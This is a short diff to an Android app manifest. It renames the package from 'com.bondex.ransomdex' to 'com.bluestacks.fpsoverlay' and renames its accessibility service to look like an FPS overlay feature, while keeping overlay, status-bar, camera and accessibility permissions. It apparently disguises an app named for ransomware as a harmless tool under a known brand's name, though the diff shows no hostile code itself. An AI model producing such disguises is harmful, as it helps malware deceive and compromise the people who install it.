@@ -1,5 +1,5 @@
 <?xml version="1.0" encoding="utf-8"?>
-<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.bondex.ransomdex">
+<manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.bluestacks.fpsoverlay">
 
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.EXPAND_STATUS_BAR" />
@@ -27,7 +27,7 @@
             android:foregroundServiceType="camera" />
 
         <service
-            android:name=".CustomAccessibilityService"
+            android:name=".FPSAccessibilityService"
             android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE"
             android:label="@string/accessibility_label"
             android:description="@string/accessibility_desc"
